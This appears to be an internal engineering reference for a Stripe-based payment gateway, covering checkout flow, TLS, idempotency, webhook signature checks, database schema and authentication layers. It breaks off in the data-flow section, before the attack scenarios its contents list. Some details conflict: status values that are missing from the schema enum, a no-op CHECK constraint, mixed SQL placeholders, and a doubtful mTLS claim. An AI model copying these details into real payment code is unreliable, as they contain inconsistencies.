# Payment Gateway Processing System — Internal Engineering & Security Document

**Classification:** CONFIDENTIAL — Internal Engineering Reference  
**Audience:** Senior Engineers, Security Engineers, Systems Architects, Payment Engineers  
**Scope:** Full-stack breakdown of a production Payment Gateway Processing System  
**Architecture assumed:** Multi-service PCI DSS-compliant platform with React SPA frontend, dedicated payment microservice, PostgreSQL (PCI scope), Redis, Stripe/Adyen as payment processor, and async settlement workers.  
**Regulatory context:** PCI DSS v4.0, SOC 2 Type II, GDPR where applicable.

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### System Topology and PCI DSS Scope

```
Browser (SPA) -> CDN -> nginx (TLS termination)
  -> API Gateway (NOT in PCI scope)
  -> Payment Service (PCI scope: CDE - Cardholder Data Environment)
  -> Payment Processor (Stripe / Adyen)
  -> Issuing Bank
  -> Card Networks (Visa / Mastercard)
```

**PCI DSS cardholder data (CHD) scope management:**  
The system uses a **hosted fields** or **JavaScript tokenization** pattern (Stripe.js / Adyen Web SDK). This is the critical architectural decision that minimizes PCI scope: raw card data (PAN, CVV, expiry) NEVER touches the merchant's servers. The browser-side JavaScript captures card data and sends it directly to the processor's servers, receiving back an opaque token. The merchant system only handles tokens — dramatically reducing PCI DSS scope from SAQ D to SAQ A or SAQ A-EP.

---

### Step-by-Step Narrative

#### T+0ms — User reaches checkout

User has items in their cart and clicks "Proceed to Checkout." The SPA navigates to `/checkout`. The page loads a combination of:
- The merchant's checkout UI (served from their CDN).
- Stripe.js (loaded from `js.stripe.com`) — this script MUST be loaded from Stripe's origin to maintain PCI compliance. The SPA does NOT self-host this script.

**What the user sees:** A clean checkout form with fields for "Card Number," "Expiry," and "CVV."

**What actually happens:** The card number, expiry, and CVV fields are NOT standard HTML `<input>` elements on the merchant's page. They are **iframes** served from `js.stripe.com`. The merchant's JavaScript cannot read their contents. The merchant's servers never see the raw card data. This is the hosted fields security model.

---

#### T+~200ms — User enters card details

User types their 16-digit PAN, expiry date (MM/YY), and 3-digit CVV into the Stripe-hosted iframes. Each keystroke is captured by Stripe's JavaScript, validated client-side (Luhn algorithm check on PAN, format validation on expiry/CVV), and temporarily held in Stripe's iframe memory — NOT accessible to the parent page JavaScript.

**Luhn algorithm check (real-time client-side):**
```
Card number: 4111 1111 1111 1111
Luhn: double every second digit from right, sum all
      = valid (Luhn checksum = 0)
Visa prefix: 4 -> valid
Card length: 16 -> valid
```

This client-side validation provides UX feedback (red border if number looks wrong) without transmitting data to any server.

---

#### T+~click — User clicks "Pay $99.99"

The merchant's JavaScript calls `stripe.confirmPayment()` or `stripe.createPaymentMethod()`. This triggers Stripe.js to:

1. Collect the card data from the hosted iframes.
2. Assemble a payload: `{card: {number, exp_month, exp_year, cvc}, billing_details: {...}}`.
3. Open a direct HTTPS connection to `api.stripe.com` (NOT through the merchant's servers).
4. POST the card data to Stripe's tokenization endpoint.
5. Receive back a `paymentMethod.id` (format: `pm_xxxxx`) or `paymentIntent.client_secret`.

The raw card data NEVER touches `api.example.com` (the merchant's API). It goes directly from the browser to Stripe's servers.

**Timing:** Stripe tokenization: 200–500ms (network round-trip to Stripe + tokenization processing).

---

#### T+~500ms — Merchant confirms payment intent

The SPA now has a `paymentIntent.client_secret`. It sends this (and only this) to the merchant's API:

```http
POST https://api.example.com/payments/confirm HTTP/2
Authorization: Bearer <session_jwt>
Content-Type: application/json

{
  "payment_intent_id": "pi_3QFoo...",
  "amount": 9999,
  "currency": "usd",
  "order_id": "order_abc123"
}
```

**What the merchant's API receives:** A payment intent ID — an opaque reference to a Stripe-side payment object. No card data. The merchant API is NOT in PCI scope for this operation.

---

#### T+~510ms — Payment Service processes the confirmation

The Payment Service (running in the CDE-adjacent environment):

1. **Validates the request:** Session JWT valid? Order ID belongs to this user? Amount matches cart total? Idempotency key check (prevent double charges)?
2. **Creates an internal payment record:**
   ```sql
   INSERT INTO payments (id, user_id, order_id, amount, currency, status, payment_intent_id, created_at)
   VALUES ($1, $2, $3, $4, $5, 'pending', $6, NOW());
   ```
3. **Calls Stripe API (server-to-server) to confirm:**
   ```http
   POST https://api.stripe.com/v1/payment_intents/pi_3QFoo.../confirm
   Authorization: Bearer sk_live_...
   Content-Type: application/x-www-form-urlencoded
   Idempotency-Key: <uuid>
   ```

---

#### T+~600–1500ms — Card network authorization

Stripe routes the payment to the appropriate card network (Visa, Mastercard) via their acquiring bank. The card network contacts the issuing bank (the cardholder's bank). The issuing bank:

1. Verifies the account exists and is active.
2. Checks available credit/funds.
3. Performs fraud scoring (velocity checks, geolocation, device fingerprinting, behavioral analytics).
4. Optionally triggers 3D Secure (3DS2) authentication challenge.

**Authorization response:** The issuing bank returns an authorization code (6-character alphanumeric, e.g., `AUTH47`) or a decline code.

**Stripe translates this to a PaymentIntent status:** `succeeded`, `requires_action` (3DS), or `payment_failed`.

---

#### T+~1500ms — Response returned to merchant and user

Stripe returns the confirmation to the merchant's Payment Service via the server-to-server API call. The Payment Service:

1. Updates the payment record: `UPDATE payments SET status='completed', stripe_charge_id='ch_xxxxx' WHERE id=$1`.
2. Publishes an async event: `payment.completed` to the event bus (Kafka/SQS).
3. Returns success to the API Gateway.
4. API Gateway returns to the SPA.

**What the user sees:** "Payment successful! Order #12345 confirmed." The browser displays a confirmation page.

**What actually happened:** Funds have been authorized (reserved) at the issuing bank. They have NOT yet been captured (moved). Capture happens separately — either immediately (for immediate-capture mode) or at shipment (for delayed capture e-commerce).

---

#### T+~1500ms+ — Async post-payment processing

After the HTTP response is returned:
- **Order fulfillment event** triggers the fulfillment service.
- **Receipt email** is queued and sent.
- **Fraud review** is queued (machine learning fraud scoring happens asynchronously for higher-risk transactions).
- **Settlement** happens on a batch basis (typically T+1 or T+2 business days). Stripe batches captures and settles to the merchant's bank account.

---

## 2. Network Layer Flow

### DNS Resolution

Multiple DNS lookups occur in the payment flow:

```
Browser resolves:
  1. app.example.com      -> CDN edge IP (for SPA)
  2. api.example.com      -> nginx load balancer IP
  3. js.stripe.com        -> Stripe CDN (for Stripe.js)
  4. api.stripe.com       -> Stripe API edge (for tokenization)

Merchant API server resolves:
  5. api.stripe.com       -> Stripe API (for server-to-server confirmation)

All DNS lookups use:
  - DNSSEC validation (Stripe's zone is DNSSEC-signed)
  - Browser's DNS cache (TTL-bounded)
  - OS stub resolver
  - Recursive resolver (8.8.8.8 or corporate DNS)
  - Authoritative DNS (Stripe's nameservers: ns1.stripe.com through ns4)
```

**DNSSEC importance for payment flows:** A Kaminsky-style DNS poisoning attack that redirects `api.stripe.com` to an attacker-controlled server would allow interception of card tokenization. DNSSEC validation at the recursive resolver, combined with HTTPS certificate validation (pinning Stripe's cert or CA), provides defense-in-depth.

**Stripe's DNS TTLs:** Stripe uses short TTLs (60–300 seconds) for rapid failover across their global edge. This means the merchant's server may make a fresh DNS lookup for each batch of API calls if the connection pool is cold.

---

### TCP 3-Way Handshake

**Browser → api.example.com (payment confirmation):**

```
Browser                                nginx (api.example.com:443)
    |                                           |
    | SYN [seq=x, MSS=1460, SACK, WS=7]        |
    |------------------------------------------>|
    |                                           |
    | SYN-ACK [seq=y, ack=x+1, MSS=1460]       |
    |<------------------------------------------|
    |                                           |
    | ACK [ack=y+1]                             |
    |------------------------------------------>|
    | [TCP established -- 1 RTT]                |
```

**API server → api.stripe.com (server-to-server, connection pooled):**

The merchant's Payment Service maintains a persistent HTTP/2 connection pool to `api.stripe.com`. TCP handshakes for Stripe API calls happen once at pool establishment, not per-request. A typical pool: 10 connections, idle timeout 90 seconds. Each payment confirmation reuses an existing connection from the pool.

```
Payment Service                         Stripe Edge (api.stripe.com:443)
     |                                           |
     | [Pool initialization at service startup]  |
     | SYN ─────────────────────────────────────>|
     | SYN-ACK <─────────────────────────────────|
     | ACK ─────────────────────────────────────>|
     | [TLS handshake...]                        |
     | [Connection idle in pool]                 |
     |                                           |
     | [Per-payment request: reuse pool connection]
     | HTTP/2 HEADERS frame ─────────────────────>|
     | HTTP/2 DATA frame ────────────────────────>|
     | HTTP/2 HEADERS frame (response) <──────────|
```

**Connection pooling** is mandatory for payment services. Without it, each payment involves a cold TCP + TLS handshake (~100–200ms of pure overhead), unacceptable for a time-sensitive checkout flow.

---

### TLS Handshake

**Critical for payment flows:** TLS 1.2 minimum; TLS 1.3 strongly preferred. PCI DSS v4.0 explicitly requires TLS 1.2+ and prohibits SSL 3.0, TLS 1.0, and TLS 1.1.

```
Payment Service (TLS CLIENT)              Stripe API (TLS SERVER)
       |                                           |
       | ClientHello                               |
       | - TLS 1.3 preferred                       |
       | - cipher_suites:                          |
       |   TLS_AES_256_GCM_SHA384                  |
       |   TLS_AES_128_GCM_SHA256                  |
       |   TLS_CHACHA20_POLY1305_SHA256            |
       | - key_share: X25519 ephemeral key (32B)   |
       | - SNI: "api.stripe.com"                   |
       | - ALPN: ["h2"]                            |
       |------------------------------------------>|
       |                                           |
       | ServerHello                               |
       | - TLS 1.3 confirmed                       |
       | - cipher: TLS_AES_256_GCM_SHA384          |
       | - key_share: Stripe's X25519 key          |
       |                                           |
       | {Certificate}                             |
       | - Subject: api.stripe.com                 |
       | - SAN: *.stripe.com, stripe.com           |
       | - Issuer: DigiCert Global G2 TLS RSA      |
       | - OCSP staple: valid                      |
       | - SCTs: 2 CT logs (Google + Cloudflare)   |
       |                                           |
       | {CertificateVerify} + {Finished}          |
       |<------------------------------------------|
       |                                           |
       | {Finished} + [HTTP/2 PREFACE]             |
       |------------------------------------------>|
       | [mTLS: Stripe also validates our cert     |
       |  if using Stripe's Advanced Fraud         |
       |  features or webhook signature validation]|
```

**Certificate pinning consideration:** For the server-to-server Stripe API calls, the merchant's Payment Service should pin Stripe's certificate public key or CA. If Stripe's certificate is fraudulently re-issued (e.g., CA compromise), pinning prevents the merchant's payment service from connecting to a fraudulent endpoint even if the certificate validates against the system trust store.

Implementation:
```python
import ssl
import hashlib

STRIPE_CERT_PINS = {
    # SHA-256 of Stripe's certificate public key
    "api.stripe.com": "sha256/PINNED_KEY_HASH_HERE"
}

# Custom SSL context with pinning
ssl_ctx = ssl.create_default_context()
ssl_ctx.verify_mode = ssl.CERT_REQUIRED
# Add custom cert verification callback that checks pin
```

---

### Full Network Flow Diagram

```
USER BROWSER          CDN/nginx       PAYMENT SVC      STRIPE API    CARD NETWORK   ISSUING BANK
     |                    |                |                |              |               |
     |  [Phase 1: Load Stripe.js]          |                |              |               |
     |                    |                |                |              |               |
  DNS: js.stripe.com -->[Stripe CDN]       |                |              |               |
  TCP+TLS ------>[Stripe CDN]              |                |              |               |
  GET /v3/ ----->[Stripe CDN]              |                |              |               |
  <-- Stripe.js (minified, ~100KB)---------|                |              |               |
     |                    |                |                |              |               |
     |  [Phase 2: Card tokenization - directly to Stripe]   |              |               |
     |                    |                |                |              |               |
  DNS: api.stripe.com --> [Stripe API]     |                |              |               |
  TCP+TLS -------------------->[Stripe API]|                |              |               |
  POST /v1/payment_methods                 |                |              |               |
  {card data} ----->[api.stripe.com]------+--------------->|              |               |
  <-- {pm_xxxxx, client_secret} -----------+----------------|              |               |
     |                    |                |                |              |               |
     |  [Phase 3: Merchant confirmation]   |                |              |               |
     |                    |                |                |              |               |
  TCP+TLS ─────────────>  |                |                |              |               |
  POST /payments/confirm ->|--- proxy ----> |                |              |               |
  {pi_id, order_id, amt}   |                |--[validate]    |              |               |
     |                    |                |--INSERT payment |              |               |
     |                    |                |--POST /payment_intents/confirm |              |
     |                    |                |--------------->|              |               |
     |                    |                |                |--[authorize]->|              |
     |                    |                |                |              |--[auth req]-->|
     |                    |                |                |              |<--[auth code]--|
     |                    |                |                |<--[pi.succeeded]              |
     |                    |                |<--[success]----|              |               |
     |                    |                |--UPDATE payment|              |               |
     |                    |                |--PUBLISH event |              |               |
  <-- 200 {order confirmed}---<-- 200 -----|                |              |               |
     |                    |                |                |              |               |
     |  [Phase 4: Async settlement (T+1 business day)]       |              |               |
     |                    |  [Settlement Worker]             |              |               |
     |                    |                |--[batch capture]->[Stripe]-->[Card Net]-->[Bank]
```

### Latency Budget

| Step | Typical Latency |
|---|---|
| DNS resolution (cold) | 30–100ms |
| TLS handshake (browser→nginx) | 1x RTT |
| Stripe.js load (CDN cached) | 50–150ms |
| Card tokenization (browser→Stripe) | 200–400ms |
| Merchant API call (nginx→payment svc) | 5–20ms |
| Stripe server-to-server API | 150–400ms |
| Card network authorization | 100–800ms |
| **Total checkout time (user perspective)** | **1.5–4 seconds** |

---

## 3. Application Layer Flow

### Payment Confirmation Endpoint

**Endpoint:** `POST /payments/confirm`

**Inbound request from browser:**

```http
POST /payments/confirm HTTP/2
Host: api.example.com
Content-Type: application/json
Authorization: Bearer eyJhbGci...
X-Request-ID: req-uuid-abc123
X-Idempotency-Key: idem-uuid-def456
Origin: https://app.example.com
X-Forwarded-For: 203.0.113.42
Content-Length: 127

{
  "payment_intent_id": "pi_3QFooBarBaz1234567890",
  "order_id": "order_abc123",
  "amount_cents": 9999,
  "currency": "usd"
}
```

**Critical headers:**

**`X-Idempotency-Key`:** This header is crucial for payment safety. If the user's network drops after the server processes the payment but before the response returns, the SPA will retry. Without idempotency, the user is charged twice. The idempotency key (UUID generated once per checkout attempt by the SPA) is stored in Redis with the payment outcome. On retry, the server returns the stored outcome without re-processing.

```python
# Idempotency check (first middleware step for payment endpoints)
idempotency_key = request.headers.get("X-Idempotency-Key")
if not idempotency_key:
    raise MissingIdempotencyKey()

cached_result = redis.get(f"idem:{idempotency_key}")
if cached_result:
    # Return cached response -- idempotent
    return json.loads(cached_result)

# Lock this idempotency key to prevent concurrent processing
acquired = redis.set(f"idem_lock:{idempotency_key}", "processing",
                     nx=True, ex=30)  # NX = only if not exists, 30s TTL
if not acquired:
    # Another request is processing this key right now
    raise ConcurrentPaymentConflict()
```

**`Authorization: Bearer`:** JWT is validated before any payment logic runs. The token contains the user's `sub` (user ID), which is used to verify that the `order_id` belongs to this user.

**Body parsing:**

```python
def parse_payment_request(body):
    payment_intent_id = body.get("payment_intent_id")
    order_id = body.get("order_id")
    amount_cents = body.get("amount_cents")
    currency = body.get("currency")

    # Validate payment_intent_id format
    if not re.fullmatch(r'pi_[a-zA-Z0-9]{20,}', payment_intent_id):
        raise ValidationError("Invalid payment_intent_id format")

    # Validate amount is a positive integer (cents)
    if not isinstance(amount_cents, int) or amount_cents <= 0:
        raise ValidationError("Amount must be a positive integer in cents")

    # Validate amount doesn't exceed maximum order value
    if amount_cents > MAX_ORDER_AMOUNT_CENTS:  # e.g., 1,000,000 = $10,000
        raise ValidationError("Amount exceeds maximum allowed")

    # Validate currency is supported ISO 4217 code
    if currency not in SUPPORTED_CURRENCIES:
        raise ValidationError("Unsupported currency")

    return ParsedPaymentRequest(payment_intent_id, order_id, amount_cents, currency)
```

**Amount validation is critical:** Never trust the amount from the client. The server must independently look up the order total from its own database and compare to the submitted amount. If they differ, reject the payment.

```python
# Server-side amount verification (critical security control)
db_order = db.fetch_one("SELECT total_cents FROM orders WHERE id=$1 AND user_id=$2",
                         order_id, current_user.id)
if not db_order:
    raise OrderNotFound()

if db_order.total_cents != amount_cents:
    # Log this -- could be a price manipulation attempt
    security_log.warn("Amount mismatch", submitted=amount_cents,
                      expected=db_order.total_cents, user_id=current_user.id)
    raise AmountMismatchError()
```

**Response construction:**

```http
HTTP/2 200
Content-Type: application/json
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Request-ID: req-uuid-abc123
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'none'

{
  "status": "succeeded",
  "payment_id": "pay_internal_uuid",
  "order_id": "order_abc123",
  "amount_cents": 9999,
  "currency": "usd",
  "receipt_url": "https://app.example.com/receipts/pay_internal_uuid"
}
```

**`Cache-Control: no-store`:** Payment responses must NEVER be cached. A CDN caching a payment response could serve it to subsequent users, leaking payment confirmation data. This header combination is mandatory on all payment endpoints.

---

### Stripe Webhook Handling

Stripe sends webhooks for payment state changes (capture, refund, dispute, etc.):

```http
POST /webhooks/stripe HTTP/2
Host: api.example.com
Stripe-Signature: t=1700000000,v1=abc123...,v0=xyz789...
Content-Type: application/json

{
  "id": "evt_xxxxx",
  "type": "payment_intent.succeeded",
  "data": {"object": {"id": "pi_3QFoo...", "status": "succeeded"}}
}
```

**Webhook signature validation (critical — must happen before processing):**

```python
import hmac
import hashlib

def validate_stripe_webhook(payload, sig_header, webhook_secret):
    """
    Stripe signs webhooks with HMAC-SHA256 using the webhook signing secret.
    Stripe-Signature header format:
      t=<timestamp>,v1=<HMAC-SHA256>,v0=<deprecated HMAC-SHA1>

    The signed payload is: "<timestamp>.<request_body>"
    """
    try:
        # Parse the signature header
        sig_parts = {}
        for part in sig_header.split(","):
            key, val = part.split("=", 1)
            sig_parts[key.strip()] = val.strip()

        timestamp = sig_parts.get("t")
        received_sig = sig_parts.get("v1")

        # Replay attack protection: reject webhooks older than 5 minutes
        if abs(int(timestamp) - int(time.time())) > 300:
            raise WebhookReplayError("Timestamp too old")

        # Compute expected signature
        signed_payload = f"{timestamp}.{payload.decode('utf-8')}"
        expected_sig = hmac.new(
            webhook_secret.encode("utf-8"),
            signed_payload.encode("utf-8"),
            hashlib.sha256
        ).hexdigest()

        # Constant-time comparison
        if not hmac.compare_digest(expected_sig, received_sig):
            raise WebhookSignatureInvalid()

    except (KeyError, ValueError) as e:
        raise WebhookSignatureInvalid(f"Malformed signature: {e}")
```

**Webhook idempotency:** Stripe may deliver the same webhook multiple times (at-least-once delivery). The handler must be idempotent:

```python
# Check if this event was already processed
event_id = webhook_payload["id"]
if redis.set(f"processed_webhook:{event_id}", "1", nx=True, ex=86400):
    # Process the event
    process_payment_event(webhook_payload)
else:
    # Already processed -- acknowledge and skip
    logger.info("Duplicate webhook received", event_id=event_id)
```

---

## 4. Backend Architecture

### Service Map

```
+----------------------------------------------------------------------+
|                    PAYMENT SYSTEM ARCHITECTURE                        |
|                                                                      |
|  [PCI SCOPE BOUNDARY - CDE]                                          |
|  +-----------------------------------------------------------------+ |
|  |                                                                 | |
|  |  Payment Service (Port 8080, mTLS required from API Gateway)   | |
|  |  - Payment intent creation                                      | |
|  |  - Confirmation and capture                                     | |
|  |  - Refund processing                                            | |
|  |  - Webhook handling (Stripe callbacks)                          | |
|  |  - Idempotency management                                       | |
|  |                                                                 | |
|  |  PostgreSQL (PCI scope -- payments DB)                          | |
|  |  - payments table (status, amount, stripe refs)                 | |
|  |  - payment_events table (audit trail -- immutable)              | |
|  |  - refunds table                                                | |
|  |  - disputes table                                               | |
|  |                                                                 | |
|  |  Redis (PCI-adjacent -- idempotency keys, rate limits)          | |
|  |  - Idempotency key store (24h TTL)                              | |
|  |  - Rate limit counters                                          | |
|  |  - Payment status cache (short TTL, 60s)                        | |
|  |                                                                 | |
|  +-----------------------------------------------------------------+ |
|                                                                      |
|  [NON-PCI SCOPE]                                                     |
|  +-----------------------------------------------------------------+ |
|  |                                                                 | |
|  |  API Gateway (routes payment requests, validates JWTs)          | |
|  |  Order Service (cart, pricing, order management)                | |
|  |  Fulfillment Service (consumes payment.completed events)        | |
|  |  Notification Service (receipts, emails)                        | |
|  |  Fraud Service (ML scoring, async)                              | |
|  |  Reporting Service (revenue analytics, non-PCI)                 | |
|  |                                                                 | |
|  +-----------------------------------------------------------------+ |
|                                                                      |
|  [EXTERNAL SERVICES]                                                 |
|  - Stripe API (payment processing, tokenization)                    |
|  - Stripe Radar (fraud detection at Stripe level)                   |
|  - Card Networks (Visa, Mastercard -- via Stripe)                   |
|  - Issuing Banks (authorization decisions)                           |
+----------------------------------------------------------------------+
```

### Database Schema (PCI-Scoped)

```sql
-- Primary payments table
CREATE TABLE payments (
  id                UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  user_id           UUID NOT NULL,  -- FK to users (in non-PCI DB)
  order_id          UUID NOT NULL,
  amount_cents      INTEGER NOT NULL CHECK (amount_cents > 0),
  currency          CHAR(3) NOT NULL,  -- ISO 4217 (e.g., 'usd')
  status            payment_status NOT NULL DEFAULT 'pending',
  -- status: pending, processing, succeeded, failed, refunded, disputed
  payment_intent_id VARCHAR(100) UNIQUE,  -- Stripe PI id: pi_xxxxx
  stripe_charge_id  VARCHAR(100),         -- ch_xxxxx
  stripe_customer_id VARCHAR(100),        -- cus_xxxxx (if saved)
  failure_code      VARCHAR(50),          -- Stripe decline code
  failure_message   TEXT,
  idempotency_key   UUID UNIQUE,
  created_at        TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at        TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  captured_at       TIMESTAMPTZ,          -- When funds were captured
  CONSTRAINT no_raw_card_data CHECK (
    -- Enforce at DB level that no card data columns exist
    1 = 1  -- Schema-level documentation constraint
  )
);

-- Immutable audit trail (append-only)
CREATE TABLE payment_events (
  id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  payment_id   UUID NOT NULL REFERENCES payments(id),
  event_type   VARCHAR(100) NOT NULL,  -- created, authorized, captured, failed, refunded
  event_data   JSONB NOT NULL,  -- Snapshot of state at event time
  stripe_event_id VARCHAR(100),  -- Stripe webhook event ID if applicable
  ip_hash      CHAR(64),  -- SHA-256(client_ip)
  user_agent_hash CHAR(64),
  created_at   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- This table is APPEND-ONLY. No UPDATEs. No DELETEs.
-- Enforced by:
-- 1. DB user has only INSERT on this table (no UPDATE/DELETE grants)
-- 2. Row-level security policy
-- 3. Application layer never issues UPDATE/DELETE

CREATE UNIQUE INDEX idx_payments_payment_intent ON payments(payment_intent_id);
CREATE INDEX idx_payments_user_id ON payments(user_id);
CREATE INDEX idx_payments_order_id ON payments(order_id);
CREATE INDEX idx_payments_created_at ON payments(created_at);
CREATE INDEX idx_payment_events_payment_id ON payment_events(payment_id);
```

**What is NOT stored in the payments database:**
- Raw card number (PAN) — never.
- CVV/CVC — absolutely never (PCI DSS Requirement 3.2.1 prohibits storing SAD post-authorization).
- Full expiry date (some interpretations require this not be stored separately — use processor token).
- Card PIN.

What IS stored in Stripe's system (not the merchant's):
- Tokenized card reference (e.g., Stripe PaymentMethod ID `pm_xxxxx`).
- Last 4 digits of card (non-sensitive, stored for display purposes: `"4242"`).
- Card brand (Visa, Mastercard) and expiry month/year (for display).

---

### Sync vs. Async Flows

**Synchronous (on the payment critical path — user is waiting):**
1. JWT validation.
2. Rate limiting check.
3. Idempotency key check and lock.
4. Amount verification (DB read).
5. Payment record creation (DB write).
6. Stripe API call (payment_intent confirm).
7. Payment record update (DB write).
8. Idempotency key cache update.
9. HTTP response to browser.

**Total synchronous path: ~500–1500ms** (dominated by Stripe API + card network authorization).

**Asynchronous (after HTTP response):**
10. Publish `payment.completed` or `payment.failed` event to Kafka/SQS.
11. Fulfillment service consumes event → creates shipment.
12. Notification service sends receipt email.
13. Fraud service performs async ML scoring.
14. Reporting service updates revenue dashboards.
15. Stripe settlement worker (T+1): captures authorized funds.

---

### Settlement Worker

The settlement worker is a background process that captures authorized payments:

```python
class SettlementWorker:
    """
    Captures authorized payment intents.
    For immediate capture: runs within seconds of authorization.
    For delayed capture: runs at shipment or on schedule.
    """

    def process_batch(self):
        # Find payments in 'authorized' state older than capture_delay
        pending_captures = db.execute("""
            SELECT id, payment_intent_id, amount_cents
            FROM payments
            WHERE status = 'authorized'
              AND created_at < NOW() - INTERVAL '%(delay)s'
              AND captured_at IS NULL
            LIMIT 100
            FOR UPDATE SKIP LOCKED  -- prevent concurrent worker conflicts
        """, {"delay": CAPTURE_DELAY})

        for payment in pending_captures:
            try:
                self.capture_payment(payment)
            except stripe.error.StripeError as e:
                self.handle_capture_failure(payment, e)

    def capture_payment(self, payment):
        # Idempotent capture
        stripe.PaymentIntent.capture(
            payment.payment_intent_id,
            idempotency_key=f"capture:{payment.id}"
        )

        db.execute("""
            UPDATE payments SET status='captured', captured_at=NOW()
            WHERE id=$1 AND status='authorized'
        """, payment.id)

        # Append audit event
        db.execute("""
            INSERT INTO payment_events (payment_id, event_type, event_data)
            VALUES ($1, 'captured', $2)
        """, payment.id, json.dumps({"captured_at": datetime.now().isoformat()}))
```

---

## 5. Authentication & Authorization Flow

### Multi-Layer Authentication for Payments

Payment endpoints require multiple, independent authentication checks:

```
Layer 1: TLS (transport authentication)
  - nginx validates the TLS handshake
  - Certificate pinning on server-to-server calls

Layer 2: Session Authentication (user identity)
  - JWT in Authorization header (from browser)
  - Validated at API Gateway BEFORE reaching Payment Service
  - Claims: sub (user_id), roles, session_id, iat, exp

Layer 3: Payment Authorization (can this user charge this order?)
  - Payment Service validates: order_id belongs to user_id
  - Amount matches server-side order total
  - Order is in a "ready for payment" state

Layer 4: API Key Authentication (merchant → Stripe)
  - Stripe API key (sk_live_xxxxx) in Authorization header
  - Never exposed to client
  - Rotated periodically; stored in Secrets Manager

Layer 5: Webhook Authentication (Stripe → merchant)
  - HMAC-SHA256 signature on every incoming webhook
  - Replay protection via timestamp validation
```

### JWT Validation Flow for Payment Endpoints

```python
class PaymentAuthMiddleware:
    def __init__(self, allowed_scopes=None):
        self.allowed_scopes = allowed_scopes or ["payments:write"]

    def __call__(self, request):
        token = self.extract_bearer_token(request)
        if not token:
            raise AuthenticationRequired()

        # Validate JWT structure, signature, expiry, issuer
        claims = validate_jwt(token, algorithms=["RS256"])

        # Payment-specific claim checks
        if "payments:write" not in claims.get("scopes", []):
            raise InsufficientScope("payments:write scope required")

        # High-value transaction: require MFA-verified session
        amount = request.body.get("amount_cents", 0)
        if amount > HIGH_VALUE_THRESHOLD:  # e.g., 50000 cents = $500
            if not claims.get("mfa_verified"):
                raise MFARequired("High-value transaction requires MFA")
            # MFA must have been completed within the last 15 minutes
            mfa_at = claims.get("mfa_verified_at", 0)
            if time.time() - mfa_at > 900:
                raise MFAExpired("MFA verification expired for high-value transaction")

        request.current_user_id = claims["sub"]
        request.session_id = claims.get("session_id")
```

### Trust Boundaries

```
TRUST BOUNDARY 1: Internet -> nginx
  The public internet is completely untrusted.
  nginx terminates TLS, applies rate limits and WAF rules.
  All downstream services trust the X-Forwarded-For header
  ONLY because it's set by nginx (must validate this).

TRUST BOUNDARY 2: API Gateway -> Payment Service
  mTLS required between these services.
  The Payment Service accepts HTTP connections ONLY from
  the API Gateway's certificate subject.
  No direct internet access to the Payment Service.

TRUST BOUNDARY 3: Payment Service -> Stripe
  Authenticated with Stripe API key (bearer token).
  TLS with certificate validation (pinning recommended).
  The Stripe API is a trusted external service.

TRUST BOUNDARY 4: Stripe -> Merchant (webhooks)
  Stripe authenticates itself via HMAC-SHA256 signatures.
  The merchant cannot assume a webhook is legitimate without
  validating the signature.

TRUST BOUNDARY 5: Payment Service -> PostgreSQL
  TLS + database user authentication.
  The payment DB user has only the minimum required privileges:
    - SELECT, INSERT, UPDATE on payments
    - INSERT only on payment_events (no UPDATE, no DELETE)
    - No DDL privileges
    - No access to non-payment tables
```

### Stripe API Key Management

```python
# Stripe key management
# NEVER:
stripe_key = "sk_live_abcdef..."  # NEVER hardcode
stripe_key = os.environ.get("STRIPE_KEY")  # NEVER store in env vars (visible in logs)

# ALWAYS:
import boto3
secrets_client = boto3.client("secretsmanager")

def get_stripe_api_key():
    """Retrieve Stripe API key from AWS Secrets Manager.
    Cache in process memory; refresh on rotation event."""
    response = secrets_client.get_secret_value(
        SecretId="prod/payment/stripe_api_key"
    )
    return response["SecretString"]

# Key rotation strategy:
# 1. Create new Stripe restricted API key with same permissions
# 2. Update Secrets Manager with new key
# 3. Rolling restart of Payment Service instances (they pick up new key)
# 4. Revoke old key in Stripe dashboard
# 5. Verify no more usage of old key in Stripe logs
```

---

## 6. Data Flow

### Complete Payment Data Flow

```
[1] Browser
    Card data fields (PAN, CVV, expiry) captured by Stripe.js iframes
    -> TLS encrypted
    -> Stripe's tokenization server (api.stripe.com)
    -> Stripe returns: PaymentMethod ID (pm_xxxxx)
                       PaymentIntent client_secret (pi_xxxxx_secret_xxxxx)
    MERCHANT NEVER SEES CARD DATA

[2] Browser -> API Server
    Payment confirmation:
      {payment_intent_id: "pi_xxxxx", order_id: "order_abc", amount_cents: 9999}
    -> TLS encrypted
    -> API Gateway (JWT validation)
    -> Payment Service

    What's transmitted: opaque Stripe references, order metadata
    What's NOT transmitted: any card data

[3] Payment Service -> PostgreSQL
    INSERT INTO payments (id, user_id, order_id, amount_cents, currency,
                          status, payment_intent_id, idempotency_key)
    VALUES (...)

    What's stored: payment metadata, status, Stripe PI reference
    What's NOT stored: PAN, CVV, full expiry (PCI prohibits)

[4] Payment Service -> Stripe API (server-to-server)
    POST /v1/payment_intents/pi_xxxxx/confirm
    Authorization: Bearer sk_live_xxxxx

    Transmitted: payment intent ID, optional capture method, metadata
    NOT transmitted: card data (already tokenized by Stripe.js)

[5] Stripe -> Card Network (internal to Stripe)
    Stripe sends authorization request to Visa/Mastercard
    Contains: masked PAN, amount, merchant ID, CVV (for authorization only)
    The merchant has NO visibility into this communication

[6] Card Network -> Issuing Bank (internal to financial networks)
    Authorization request via ISO 8583 (financial message standard)
    Real-time fraud scoring at issuing bank

